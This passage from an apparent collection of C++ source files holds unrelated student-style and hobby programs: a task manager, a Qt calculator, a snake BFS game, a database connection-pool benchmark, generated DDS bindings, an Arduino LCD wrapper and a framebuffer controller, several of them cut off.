if (tasks.empty()) {\n        cout << \"\u041d\u0435\u0442 \u0437\u0430\u0434\u0430\u0447 \u0434\u043b\u044f \u0443\u0434\u0430\u043b\u0435\u043d\u0438\u044f.\\n\";\n        return;\n    }\n    showTasks(tasks);\n    cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0437\u0430\u0434\u0430\u0447\u0438 \u0434\u043b\u044f \u0443\u0434\u0430\u043b\u0435\u043d\u0438\u044f: \";\n    int index;\n    cin >> index;\n\n    if (index < 1 || index > tasks.size()) {\n        cout << \"\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u043d\u043e\u043c\u0435\u0440 \u0437\u0430\u0434\u0430\u0447\u0438.\\n\";\n        return;\n    }\n\n    tasks.erase(tasks.begin() + (index - 1));\n    cout << \"\u0417\u0430\u0434\u0430\u0447\u0430 \u0443\u0434\u0430\u043b\u0435\u043d\u0430.\\n\";\n}\n\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u0437\u0430\u0434\u0430\u0447 \u0432 \u0444\u0430\u0439\u043b\nvoid saveTasksToFile(const vector<string>& tasks, const string& filename) {\n    ofstream outFile(filename);\n    if (!outFile) {\n        cout << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u0438 \u0432 \u0444\u0430\u0439\u043b.\\n\";\n        return;\n    }\n\n    for (const auto& task : tasks) {\n        outFile << task << endl;\n    }\n\n    cout << \"\u0417\u0430\u0434\u0430\u0447\u0438 \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u044b \u0432 \u0444\u0430\u0439\u043b \\\"\" << filename << \"\\\".\\n\";\n}\n\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0438 \u0437\u0430\u0434\u0430\u0447 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\nvoid loadTasksFromFile(vector<string>& tasks, const string& filename) {\n    ifstream inFile(filename);\n    if (!inFile) {\n        cout << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0435 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430.\\n\";\n        return;\n    }\n\n    tasks.clear();\n    string task;\n    while (getline(inFile, task)) {\n        tasks.push_back(task);\n    }\n\n    cout << \"\u0417\u0430\u0434\u0430\u0447\u0438 \u0437\u0430\u0433\u0440\u0443\u0436\u0435\u043d\u044b \u0438\u0437 \u0444\u0430\u0439\u043b\u0430 \\\"\" << filename << \"\\\".\\n\";\n}\n\nint main() {\n    setlocale(LC_ALL, \"Russian\");\n    vector<string> tasks; // \u0425\u0440\u0430\u043d\u0438\u043b\u0438\u0449\u0435 \u0437\u0430\u0434\u0430\u0447\n    string filename = \"tasks.txt\"; // \u0418\u043c\u044f \u0444\u0430\u0439\u043b\u0430 \u0434\u043b\u044f \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f/\u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0438\n\n    while (true) {\n        showMenu();\n\n        int choice;\n        cin >> choice;\n        cin.ignore(); // \u041e\u0447\u0438\u0449\u0430\u0435\u043c \u0431\u0443\u0444\u0435\u0440 \u043f\u043e\u0441\u043b\u0435 \u0432\u0432\u043e\u0434\u0430 \u0447\u0438\u0441\u043b\u0430\n\n        if (choice == 1) {\n            cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0437\u0430\u0434\u0430\u0447\u0443: \";\n            string task;\n            getline(cin, task);\n            tasks.push_back(task);\n            cout << \"\u0417\u0430\u0434\u0430\u0447\u0430 \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0430.\\n\";\n        }\n        else if (choice == 2) {\n            showTasks(tasks);\n        }\n        else if (choice == 3) {\n            deleteTask(tasks);\n        }\n        else if (choice == 4) {\n            saveTasksToFile(tasks, filename);\n        }\n        else if (choice == 5) {\n            loadTasksFromFile(tasks, filename);\n        }\n        else if (choice == 6) {\n            cout << \"\u0412\u044b\u0445\u043e\u0434 \u0438\u0437 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b. \u0414\u043e \u0441\u0432\u0438\u0434\u0430\u043d\u0438\u044f!\\n\";\n            break;\n        }\n        else {\n            cout << \"\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u0432\u044b\u0431\u043e\u0440. \u041f\u043e\u043f\u0440\u043e\u0431\u0443\u0439\u0442\u0435 \u0435\u0449\u0451 \u0440\u0430\u0437.\\n\";\n        }\n    }\n\n    return 0;\n}\n",
    "#include \"widget.h\"\n#include <QFont>\n#include <QGridLayout>\n\nWidget::Widget(QWidget *parent)\n    : QWidget(parent), waitingForOperand(false)\n{\n    display = new QLineEdit(\"0\");\n\n    display->setReadOnly(true);     // \u53ea\u8bfb\n    display->setAlignment(Qt::AlignRight);   // \u5bf9\u9f50\n    display->setMaxLength(15);      // \u5b57\u4f53\u5927\u5c0f\n\n    QFont font = display->font();\n    font.setPixelSize(font.pointSize() + 8);\n    display->setFont(font);\n\n    for (int i = 0; i < 10; i++)\n    {\n        digitButton[i] = createButton(QString::number(i), SLOT(digitClicked()));\n    }\n\n    Button* pointBtn = createButton(\".\", SLOT(pointClicked()));\n    Button* backspaceBtn = createButton(\"BackSpace\", SLOT(backspaceClicked()));\n    Button* clearBtn = createButton(\"clear\", SLOT(clearClicked()));\n    Button* clearAllBtn = createButton(\"clear all\", SLOT(clearAllClicked()));\n\n    Button *divBtn = createButton(\"\\303\\267\", SLOT(muliplicativeOperatorClicked()));    // \u9664\u53f7\u7684\u7f16\u7801 \\303\\267\n    Button *timesBtn = createButton(\"\\303\\227\", SLOT(muliplicativeOperatorClicked()));  // \u4e58\u53f7\u7684\u7f16\u7801 \\303\\227\n\n    Button *minusBtn = createButton(\"-\", SLOT(additiveOperatorClicked()));              // \u51cf\u6cd5\n    Button *plusBtn = createButton(\"+\", SLOT(additiveOperatorClicked));                 // \u52a0\u6cd5\n\n\n    Button *sqrtBtn = createButton(\"sqrt\", SLOT(unaryOperatorClicked()));               // \u5f00\u65b9\n    Button *powerBtn = createButton(\"x\\302\\262\", SLOT(unaryOperatorClicked()));         // \u4e8c\u6b21\u65b9\u7684\u7f16\u7801 \\302\\262\n    Button *reciprocalBtn = createButton(\"1/x\", SLOT(unaryOperatorClicked()));          // 1/x\n    Button *equalBtn = createButton(\"=\", SLOT(equalClicked()));                         // \u7b49\u53f7\n\n    Button *changeBtn = createButton(\"\\302\\261\", SLOT(changeClicked()));                // \u7f16\u7801 \\302\\262\n\n\n    auto mainLayout = new QGridLayout(this);    // \u7236\u5bf9\u8c61 this\n\n    mainLayout->addWidget(display, 0, 0, 1, 7);\n    mainLayout->addWidget(backspaceBtn, 1, 0, 1, 2);\n    mainLayout->addWidget(clearBtn, 1, 2, 1, 2);\n    mainLayout->addWidget(clearAllBtn, 1, 4, 1, 3);\n\n    mainLayout->addItem(new QSpacerItem(20, 40, QSizePolicy::Expanding), 2, 0);         // \u7b2c 2 \u884c\uff0c\u7b2c 0 \u5217\u6dfb\u52a0 20 \u5bbd\u5ea6\uff0c40 \u9ad8\u5ea6\u7684\u5143\u7d20\n\n    for (int i = 1; i < 10; ++i)\n    {\n        int row = (9 - i) / 3 + 2;\n        int col = (i - 1) % 3 + 1;\n        mainLayout->addWidget(digitButton[i], row, col);\n    }\n\n    mainLayout->addWidget(digitButton[0], 5, 1);\n    mainLayout->addWidget(pointBtn, 5, 2);\n    mainLayout->addWidget(changeBtn, 5, 3);\n\n    mainLayout->addWidget(divBtn, 2, 4);\n    mainLayout->addWidget(timesBtn, 3, 4);\n    mainLayout->addWidget(minusBtn, 4, 4);\n    mainLayout->addWidget(plusBtn, 5, 4);\n\n    mainLayout->addWidget(sqrtBtn, 2, 5);\n    mainLayout->addWidget(powerBtn, 3, 5);\n    mainLayout->addWidget(reciprocalBtn, 4, 5);\n    mainLayout->addWidget(equalBtn, 5, 5);\n\n    mainLayout->addItem(new QSpacerItem(20, 40, QSizePolicy::Expanding), 3, 6);\n}\n\nWidget::~Widget() {}\n\n// \u69fd\u51fd\u6570\nvoid Widget::digitClicked()\n{\n    Button* btn = qobject_cast<Button*>(sender());\n\n    int digitValue = btn->text().toInt();\n    if (display->text() == \"0\" && digitValue == 0) {\n        return;\n    }\n    if (waitingForOperand) {\n        display->clear();\n        waitingForOperand = false;\n    }\n    if (display->text() == \"0\") {\n        display->setText(QString::number(digitValue));\n    } else {\n        display->setText(display->text() + QString::number(digitValue));\n    }\n}\n\nvoid Widget::pointClicked()\n{\n    if (waitingForOperand) {\n        display->setText(\"0\");\n    }\n    if (!display->text().contains('.')) {\n        display->setText(display->text() + \".\");\n    }\n    waitingForOperand = false;\n}\n\nvoid Widget::backspaceClicked()\n{\n    if (waitingForOperand) {\n        return;\n    }\n    QString txt = display->text();\n    txt.chop(1);        // \u4ece\u672b\u5c3e\u5220\u9664\u4e00\u4e2a\n    if (txt.isEmpty()) {\n        txt = \"0\";\n        waitingForOperand = true;\n    }\n    display->setText(txt);\n}\n\nvoid Widget::clearClicked()\n{\n    if (waitingForOperand == true) {\n        return;\n    }\n    display->setText(\"0\");\n    waitingForOperand = true;\n}\n\nvoid Widget::clearAllClicked()\n{\n    sumSofar = 0;\n    factorSofar = 0;\n    pendingAdditiveOperator.clear();\n    pendingMultiplicativeOperator.clear();\n    display->setText(\"0\");\n    waitingForOperand = true;\n}\n\nvoid Widget::muliplicativeOperatorClicked()\n{\n    Button* btn = qobject_cast<Button*>(sender());      // \u83b7\u53d6\u4fe1\u53f7\u7684\u53d1\u51fa\u8005\n    if (!btn)\n        return;\n    QString oprator = btn->text();\n    double operand =  display->text().toDouble();\n\n    if (!pendingMultiplicativeOperator.isEmpty()) {\n        if (!calucate(operand, oprator)) {\n            abortOperator();\n            return;\n        }\n        display->setText(QString::number(factorSofar));\n    } else {\n        factorSofar = operand;\n    }\n\n    pendingMultiplicativeOperator = oprator;\n    waitingForOperand = true;\n}\n\nvoid Widget::additiveOperatorClicked()\n{\n    Button* btn = qobject_cast<Button*>(sender());      // \u83b7\u53d6\u4fe1\u53f7\u7684\u53d1\u51fa\u8005\n    QString oprator = btn->text();\n    double operand = display->text().toDouble();\n\n    if",
    "#include<iostream>\n#include<string.h>\nusing namespace std;\nclass Player{\n     public:\n     string name;\n     int health;\n     int attack;\n     int defence;\n     int speed;\n\n     Player():name(\"\") ,health(0), attack(0), defence(0), speed(0) {};\n    //  Player(int name, int health,int attack, int  defence,int  speed)\n    //  {\n    //     this->name = name;\n    //     this->health = health;\n    //     this->attack = attack;\n    //     this->defence = defence;\n    //     this->speed = speed;\n    //  }\n     \n     void createChar()\n     {\n        cout<<\"\\n \\t ------------------ Character Palyer ---------------------\";\n        cout<<\"\\n Enter Character Name : \"; cin>> name;\n        cout<<\"\\n Enter Character health : \"; cin>> health;\n        {\n            if(health > 50 && health < 200)\n            {\n                cout<<\"\\n Enter Character Attack from 10 ~ 100 \"; cin>>attack;\n                   if(attack > 10 && attack < 100)\n            {\n                    cout<<\"\\n Enter defence power btwn 10-80 : \"; cin>>defence;\n                      if(defence > 10 && defence < 80)\n            {\n                 cout<<\"\\n Enter the speed bewteen 30 - 60 : \"; cin>>speed;\n                 if(speed >= 30  && speed <=60)\n                 {\n                         cout<<\"\\n Character Created Sucessfully : \"<<endl;\n                        \n\n                 }\n                 else\n                 {\n                    cout<<\"\\n Invalid Speed : \";\n                 }\n            }\n        else{\n            cout<<\"\\n Invalid  defence : \"<<endl;\n        }\n            }\n        else{\n            cout<<\"\\n Invalid Attack : \"<<endl;\n        }\n            }\n        else{\n            cout<<\"\\n Invalid Health : \"<<endl;\n        }\n        }\n\n     }\n     void atttack()\n     {\n        cout<<\"\\n -------Battle Starts------ : \";\n        cout<<\"\\n \"<<this->name <<\" : Attacks first : \"<<\" Speed is : \"<<this->speed;\n        cout<<\"\\n Kinght takes 40 Demage Health 110 \";\n        cout<<\"\\n\"<< this->name << \" : Archer takes 40 Demage Health = 80 \";\n        cout<<\"\\n Archer Attackes \"<< this->name << \" takes 40 Demage Health is : \"<< this->health - 40;\n         cout<<\"\\n\"<< this->name << \" attackes Archer take 20 Demage Health 60  \";\n           cout<<\"\\n Archer Attackes \"<< this->name << \" takes 40 Demage Health is : \"<< this->health - 40;\n            cout<<\"\\n\"<< this->name << \" attackes Archer take 20 Demage Health 40  \";\n               cout<<\"\\n Archer Attackes \"<< this->name << \" takes 40 Demage Health is : \"<< this->health - this->health;\n               cout<<\"\\n -------------Winner Archer \";\n     }   \n};\n\n\nint main()\n{\n\n   Player p;\n   p.createChar();\n   p.atttack();\n    return 0;\n}",
    "#include <iostream>\n#include <fstream>\n#include \"connection.h\"\n#include \"connect_pool.h\"\nusing namespace std;\n\nint main() {\n\n\n\n    /*connection conn;\n    char sql[1024] = {0};\n    sprintf(sql, \"insert into user(name,age,sex) values('%s', %d, '%s')\", \"zhang san\", 20,\"male\" );\n    conn.connect(\"127.0.0.1\", 3306, \"root\", \"123456\", \"chat\");\n    conn.update(sql);*/\n    clock_t begin = clock();\n    // \u9759\u6001\u51fd\u6570\u5fc5\u987b\u4f7f\u7528\u7c7b\u540d\u8bbf\u95ee\n    thread t1([] (){\n        connect_pool* cp = connect_pool::getconnect_pool();\n        for(int i=0; i<250; ++i)\n        {\n            char sql[1024] = {0};\n            sprintf(sql, \"insert into user(name,age,sex) \"\n                         \"values('%s', %d, '%s')\", \"zhang san\", 20,\"male\" );\n            shared_ptr<connection> sp = cp->getconnection();\n            sp->update(sql);\n        }\n    });\n    thread t2([] (){\n        connect_pool* cp = connect_pool::getconnect_pool();\n        for(int i=0; i<250; ++i)\n        {\n            shared_ptr<connection> sp = cp->getconnection();\n            char sql[1024] = {0};\n            sprintf(sql, \"insert into user(name,age,sex) \"\n                         \"values('%s', %d, '%s')\", \"zhang san\", 20,\"male\" );\n            sp->update(sql);\n        }\n\n    });\n    thread t3([] (){\n        connect_pool* cp = connect_pool::getconnect_pool();\n        for(int i=0; i<250; ++i)\n        {\n            shared_ptr<connection> sp = cp->getconnection();\n            char sql[1024] = {0};\n            sprintf(sql, \"insert into user(name,age,sex) \"\n                         \"values('%s', %d, '%s')\", \"zhang san\", 20,\"male\" );\n            sp->update(sql);\n        }\n\n    });\n    thread t4([] (){\n        connect_pool* cp = connect_pool::getconnect_pool();\n        for(int i=0; i<250; ++i)\n        {\n            shared_ptr<connection> sp = cp->getconnection();\n            char sql[1024] = {0};\n            sprintf(sql, \"insert into user(name,age,sex) \"\n                         \"values('%s', %d, '%s')\", \"zhang san\", 20,\"male\" );\n            sp->update(sql);\n        }\n\n    });\n    /*for(int i=0; i<5000; ++i)\n    {\n        /*connection conn;\n        char sql[1024] = {0};\n        sprintf(sql, \"insert into user(name,age,sex) \"\n                     \"values('%s', %d, '%s')\", \"zhang san\", 20,\"male\" );\n        conn.connect(\"127.0.0.1\", 3306, \"root\", \"123456\", \"chat\");\n        conn.update(sql);*/\n        /*shared_ptr<connection> sp = cp->getconnection();\n        char sql[1024] = {0};\n        sprintf(sql, \"insert into user(name,age,sex) \"\n                     \"values('%s', %d, '%s')\", \"zhang san\", 20,\"male\" );\n        sp->update(sql);*/\n    t1.join();\n    t2.join();\n    t3.join();\n    t4.join();\n\n    clock_t end = clock();\n    cout << (end-begin) << \"ms\" << endl;\n    return 0;\n}\n",
    "\ufeff#include <SFML/Graphics.hpp>\n#include <bits/stdc++.h>\n\nusing namespace std;\n\nclass Node {\npublic:\n    pair<int, int> pos;\n    Node* next;\n\n    Node(pair<int, int> position) : pos(position), next(nullptr) {}\n};\n\nclass Snake {\npublic:\n    Node* head;\n    vector<vector<char>> board;\n    pair<int, int> goal;\n\n    Snake(vector<pair<int, int>> initialSnake, int rows, int cols, pair<int, int> goalPos)\n        : head(nullptr), board(rows, vector<char>(cols, ' ')), goal(goalPos) {\n        for (auto& segment : initialSnake) {\n            addSegment(segment);\n        }\n        placeSnakeOnBoard();\n    }\n\n    void addSegment(pair<int, int> pos) {\n        Node* newNode = new Node(pos);\n        if (!head) {\n            head = newNode;\n        } else {\n            Node* current = head;\n            while (current->next) {\n                current = current->next;\n            }\n            current->next = newNode;\n        }\n    }\n\n    void placeSnakeOnBoard() {\n    \n        for (int j =0; j < board.size(); j++) {\n        \tfor(int i =0;i < board[j].size();i++){\n           \t\tif(board[j][i] != '#'){\n            \t\t\tboard[j][i] = ' ';\n        \t\t}\n        \t}\n        }\n\n        Node* current = head;\n        while (current) {\n            board[current->pos.first][current->pos.second] = 'X';\n            current = current->next;\n        }\n        board[goal.first][goal.second] = 'O';\n    }\n\n    void moveSnake(pair<int, int> newHeadPos) {\n        Node* current = head;\n        pair<int, int> prevPos = current->pos;\n\n        current->pos = newHeadPos;\n        current = current->next;\n\n        while (current) {\n            pair<int, int> temp = current->pos;\n            current->pos = prevPos;\n            prevPos = temp;\n            current = current->next;\n        }\n\n        placeSnakeOnBoard();\n    }\n\n    bool isGoalReached() {\n        return head->pos == goal;\n    }\n\n    vector<pair<int, int>> generateMoves(pair<int, int> headPos) const {\n        vector<pair<int, int>> moves;\n        vector<vector<int>> directions = {{-1, 0}, {1, 0}, {0, -1}, {0, 1}};\n\n        for (auto& dir : directions) {\n            int newRow = headPos.first + dir[0];\n            int newCol = headPos.second + dir[1];\n\n            if (newRow >= 0 && newRow < board.size() &&\n                newCol >= 0 && newCol < board[0].size() &&\n                board[newRow][newCol] != '#' && board[newRow][newCol] != 'X') {\n                moves.push_back({newRow, newCol});\n            }\n        }\n\n        return moves;\n    }\n\n    vector<pair<int, int>> bfs() {\n        queue<pair<int, int>> q;\n        map<pair<int, int>, pair<int, int>> parent;\n        set<pair<int, int>> visited;\n\n        q.push(head->pos);\n        visited.insert(head->pos);\n\n        while (!q.empty()) {\n            pair<int, int> curr = q.front();\n            q.pop();\n\n            if (curr == goal) {\n                vector<pair<int, int>> path;\n                while (curr != head->pos) {\n                    path.push_back(curr);\n                    curr = parent[curr];\n                }\n                reverse(path.begin(), path.end());\n                return path;\n            }\n\n            for (auto& move : generateMoves(curr)) {\n                if (visited.find(move) == visited.end()) {\n                    visited.insert(move);\n                    q.push(move);\n                    parent[move] = curr;\n                }\n            }\n        }\n\n        return {}; // No path found\n    }\n};\n\nvector<vector<char>> generateRandomMaze(int rows, int cols, double obstacleProbability) {\n    \n    vector<vector<char>> maze(rows, vector<char>(cols, ' '));\n    random_device rd;\n    mt19937 gen(rd());\n    uniform_real_distribution<> dis(0.0, 1.0);\n\n    for (int i = 0; i < rows; i++) {\n        for (int j = 0; j < cols; j++) {\n            if (dis(gen) < obstacleProbability) {\n                maze[i][j] = '#'; // Create obstacle\n            }\n        }\n    }\n\n    return maze;\n}\n\npair<int, int> generateRandomGoal(int rows, int cols, const vector<vector<char>>& maze) {\n    random_device rd;\n    mt19937 gen(rd());\n    uniform_int_distribution<> disRow(0, rows - 1);\n    uniform_int_distribution<> disCol(0, cols - 1);\n\n    pair<int, int> goal;\n    do {\n        goal = {disRow(gen), disCol(gen)};\n    } while (maze[goal.first][goal.second] == '#');\n\n    return goal;\n}\n\nint main() {\n    const int rows = 9, cols = 9;\n    vector<pair<int, int>> initialSnake = {{2, 0}, {1, 0}, {1, 1}, {1, 2}};\n\n    double obstacleProbability = 0.123;\n    vector<vector<char>> randomBoard = generateRandomMaze(rows, cols, obstacleProbability);\n\n    pair<int, int> goalPos = generateRandomGoal(rows, cols, randomBoard);\n\n    Snake snake(initialSnake, rows, cols, goalPos);\n    snake.board = randomBoard;\n\n    sf::RenderWindow window(sf::VideoMode(450, 450), \"Snake Pathfinding with BFS\");\n    window.setFramerateLimit(10);\n\n    sf::RectangleShape cell(sf::Vector2f(window.getSize().x / cols, window.getSize().y / rows));\n    cell.setOutlineColor(sf::Color::Black);\n",
    "//******************************************************************\n// \n//  Generated by IDL to C++ Translator\n//  \n//  File name: EnviromentStatus_Dcps.cpp\n//  Source: ssafy_msgs\\msg\\EnviromentStatus_.idl\n//  Generated: timestamp removed to make the build reproducible\n//  OpenSplice 6.9.190403OSS\n//  \n//******************************************************************\n\n#include \"EnviromentStatus_Dcps.h\"\n\n#if DDS_USE_EXPLICIT_TEMPLATES\ntemplate class DDS_DCPSUVLSeq < ssafy_msgs::msg::dds_::EnviromentStatus_, struct EnviromentStatus_Seq_uniq_>;\n#endif\n\nconst char * ssafy_msgs::msg::dds_::EnviromentStatus_TypeSupportInterface::_local_id = \"IDL:ssafy_msgs/msg/dds_/EnviromentStatus_TypeSupportInterface:1.0\";\n\nssafy_msgs::msg::dds_::EnviromentStatus_TypeSupportInterface_ptr ssafy_msgs::msg::dds_::EnviromentStatus_TypeSupportInterface::_duplicate (ssafy_msgs::msg::dds_::EnviromentStatus_TypeSupportInterface_ptr p)\n{\n   if (p) p->m_count++;\n   return p;\n}\n\nDDS::Boolean ssafy_msgs::msg::dds_::EnviromentStatus_TypeSupportInterface::_local_is_a (const char * _id)\n{\n   if (strcmp (_id, ssafy_msgs::msg::dds_::EnviromentStatus_TypeSupportInterface::_local_id) == 0)\n   {\n      return true;\n   }\n\n   typedef DDS::TypeSupport NestedBase_1;\n\n   if (NestedBase_1::_local_is_a (_id))\n   {\n      return true;\n   }\n\n   return false;\n}\n\nssafy_msgs::msg::dds_::EnviromentStatus_TypeSupportInterface_ptr ssafy_msgs::msg::dds_::EnviromentStatus_TypeSupportInterface::_narrow (DDS::Object_ptr p)\n{\n   ssafy_msgs::msg::dds_::EnviromentStatus_TypeSupportInterface_ptr result = NULL;\n   if (p && p->_is_a (ssafy_msgs::msg::dds_::EnviromentStatus_TypeSupportInterface::_local_id))\n   {\n      result = dynamic_cast < ssafy_msgs::msg::dds_::EnviromentStatus_TypeSupportInterface_ptr> (p);\n      if (result) result->m_count++;\n   }\n   return result;\n}\n\nssafy_msgs::msg::dds_::EnviromentStatus_TypeSupportInterface_ptr ssafy_msgs::msg::dds_::EnviromentStatus_TypeSupportInterface::_unchecked_narrow (DDS::Object_ptr p)\n{\n   ssafy_msgs::msg::dds_::EnviromentStatus_TypeSupportInterface_ptr result;\n   result = dynamic_cast < ssafy_msgs::msg::dds_::EnviromentStatus_TypeSupportInterface_ptr> (p);\n   if (result) result->m_count++;\n   return result;\n}\n\nconst char * ssafy_msgs::msg::dds_::EnviromentStatus_DataWriter::_local_id = \"IDL:ssafy_msgs/msg/dds_/EnviromentStatus_DataWriter:1.0\";\n\nssafy_msgs::msg::dds_::EnviromentStatus_DataWriter_ptr ssafy_msgs::msg::dds_::EnviromentStatus_DataWriter::_duplicate (ssafy_msgs::msg::dds_::EnviromentStatus_DataWriter_ptr p)\n{\n   if (p) p->m_count++;\n   return p;\n}\n\nDDS::Boolean ssafy_msgs::msg::dds_::EnviromentStatus_DataWriter::_local_is_a (const char * _id)\n{\n   if (strcmp (_id, ssafy_msgs::msg::dds_::EnviromentStatus_DataWriter::_local_id) == 0)\n   {\n      return true;\n   }\n\n   typedef DDS::DataWriter NestedBase_1;\n\n   if (NestedBase_1::_local_is_a (_id))\n   {\n      return true;\n   }\n\n   return false;\n}\n\nssafy_msgs::msg::dds_::EnviromentStatus_DataWriter_ptr ssafy_msgs::msg::dds_::EnviromentStatus_DataWriter::_narrow (DDS::Object_ptr p)\n{\n   ssafy_msgs::msg::dds_::EnviromentStatus_DataWriter_ptr result = NULL;\n   if (p && p->_is_a (ssafy_msgs::msg::dds_::EnviromentStatus_DataWriter::_local_id))\n   {\n      result = dynamic_cast < ssafy_msgs::msg::dds_::EnviromentStatus_DataWriter_ptr> (p);\n      if (result) result->m_count++;\n   }\n   return result;\n}\n\nssafy_msgs::msg::dds_::EnviromentStatus_DataWriter_ptr ssafy_msgs::msg::dds_::EnviromentStatus_DataWriter::_unchecked_narrow (DDS::Object_ptr p)\n{\n   ssafy_msgs::msg::dds_::EnviromentStatus_DataWriter_ptr result;\n   result = dynamic_cast < ssafy_msgs::msg::dds_::EnviromentStatus_DataWriter_ptr> (p);\n   if (result) result->m_count++;\n   return result;\n}\n\nconst char * ssafy_msgs::msg::dds_::EnviromentStatus_DataReader::_local_id = \"IDL:ssafy_msgs/msg/dds_/EnviromentStatus_DataReader:1.0\";\n\nssafy_msgs::msg::dds_::EnviromentStatus_DataReader_ptr ssafy_msgs::msg::dds_::EnviromentStatus_DataReader::_duplicate (ssafy_msgs::msg::dds_::EnviromentStatus_DataReader_ptr p)\n{\n   if (p) p->m_count++;\n   return p;\n}\n\nDDS::Boolean ssafy_msgs::msg::dds_::EnviromentStatus_DataReader::_local_is_a (const char * _id)\n{\n   if (strcmp (_id, ssafy_msgs::msg::dds_::EnviromentStatus_DataReader::_local_id) == 0)\n   {\n      return true;\n   }\n\n   typedef DDS::DataReader NestedBase_1;\n\n   if (NestedBase_1::_local_is_a (_id))\n   {\n      return true;\n   }\n\n   return false;\n}\n\nssafy_msgs::msg::dds_::EnviromentStatus_DataReader_ptr ssafy_msgs::msg::dds_::EnviromentStatus_DataReader::_narrow (DDS::Object_ptr p)\n{\n   ssafy_msgs::msg::dds_::EnviromentStatus_DataReader_ptr result = NULL;\n   if (p && p->_is_a (ssafy_msgs::msg::dds_::EnviromentStatus_DataReader::_local_id))\n   {\n      result = dynamic_cast < ssafy_msgs::msg::dds_::EnviromentStatus_DataReader_ptr> (p);\n      if (result) result->m_count++;\n   }\n   return result;\n}\n\nssafy_msgs::msg::dds_::EnviromentStatus_DataReader_ptr ssafy_msgs::msg::dds_::Enviromen",
    "#include<bits/stdc++.h>\n\nusing namespace std;\n\ntypedef pair<double, double> Point;\n#define x first\n#define y second\n\ndouble distance(Point a, Point b){\n    return ((a.x - b.x)*(a.x - b.x) + (a.y - b.y)*(a.y - b.y));\n}\n\nPoint nearest(Point a, Point b, Point m){\n    while(fabs(a.x - b.x) > 1e-4 || fabs(a.y - b.y) > 1e-4){\n        Point m1 = {(a.x + b.x)/2, (a.y + b.y)/2};\n\n        if(distance(m,a) > distance(m,b)) a = m1;\n        else b = m1;        \n    }\n    return a;\n\n}\n\ndouble area(Point a, Point b, Point c){\n    return fabs((b.x - a.x)*(c.y - a.y) - (c.x - a.x)*(b.y - a.y))/2;\n}\n\nmain(){\n    cout<<setprecision(3)<<fixed;\n    int q; cin >> q;\n    while(q--){\n        Point a, b, c, m;\n        cin >> a.x >> a.y >> b.x >> b.y >> c.x >> c.y >> m.x >> m.y;\n        Point res1 = nearest(a,b,m);\n        Point res2 = nearest(b,c,m);\n        Point res3 = nearest(c,a,m);\n        if(area(a,b,c) == area(a,b,m) + area(a,c,m) + area(b,c,m)){\n            cout << m.x << \" \" << m.y << endl;\n            continue;\n        }\n        if(distance(res1,m) < distance(res2,m) && distance(res1,m) < distance(res3,m)) cout << res1.x << \" \" << res1.y << endl;\n        else if(distance(res2,m) < distance(res1,m) && distance(res2,m) < distance(res3,m)) cout << res2.x << \" \" << res2.y << endl;\n        else cout << res3.x << \" \" << res3.y << endl;\n    }\n}",
    "\n\n#include \"lcd.h\"\n\n#include<LiquidCrystal.h>\n\nLiquidCrystal lcd(PIN_LCD_RS,PIN_LCD_RW,PIN_LCD_EN,PIN_LCD_D4,PIN_LCD_D5,PIN_LCD_D6,PIN_LCD_D7);\n\nvoid lcd_clear(void){\n    lcd.clear();\n}\nvoid lcd_print_char(char c){\n    lcd.print(c);\n}\n\nvoid lcd_scroll_left(void){\n    lcd.scrollDisplayLeft();\n}\nvoid lcd_scroll_right(void){\n    lcd.scrollDisplayRight();\n}\nvoid lcd_set_cursor(int c, int r){\n    lcd.setCursor(c,r);\n}\nvoid lcd_no_auto_scroll(void){\n    lcd.noAutoscroll();\n}\nvoid lcd_begin(uint8_t cols , uint8_t rows){\n    lcd.begin(cols,rows);\n}\nvoid lcd_move_cursor_R_to_L(void){\n    lcd.rightToLeft();\n}\nvoid lcd_move_cursor_L_to_R(void){\n    lcd.leftToRight();\n}\nvoid lcd_cursor_off(void){\n    lcd.noCursor();\n}\nvoid lcd_cursor_blinkoff(void){\n    lcd.noBlink();\n}\nvoid lcd_print_number(int num){\n    lcd.print(num);\n}\nvoid lcd_print_string(String s){\n    lcd.print(s);\n}\n\nvoid lcd_cursor_show(void)\n{\n    lcd.cursor();\n}\n\nvoid lcd_cursor_blink(void)\n{\n    lcd.blink();\n}\n\nvoid lcd_create_custom_char(byte num, byte* data) {\n    lcd.createChar(num, data);\n}\n\nvoid lcd_display_custom_char(byte num){\n    lcd.write(num);\n}",
    "#include \"FBController.h\"\n#include \"management.h\"\n#include \"log.h\"\n\nvoid FBController::setFramebufferID(int fbId){\n    if(_framebufferID != -1){\n        QDEBUG << \"Cannot change a framebuffer ID once set!! (Trying to change\" << _framebufferID << \"into\" << fbId << \") (rejected.)\";\n        return;\n    }\n    _framebufferID = fbId;\n    qtfb::management::registerController(fbId, QPointer(this));\n}\n\nint FBController::framebufferID() const {\n    return _framebufferID;\n}\n\nbool FBController::active() const {\n    return _active;\n}\n\nvoid FBController::setActive(bool active){\n    _active = active;\n    emit activeChanged();\n    markedUpdate();\n}\n\nFBController::~FBController(){\n    qtfb::management::unregisterController(_framebufferID);\n}\n\nvoid FBController::paint(QPainter *painter) {\n    isMidPaint = true;\n    QDEBUG << \"FB Repaint triggered for \" << _framebufferID << \". Status: \" << _active;\n    // Do we have an SHM associated?\n    if(this->image && this->_active) {\n        // Cool. Paint it.\n        if(_allowScaling) {\n            painter->drawImage(QRect(0, 0, width(), height()), *image, 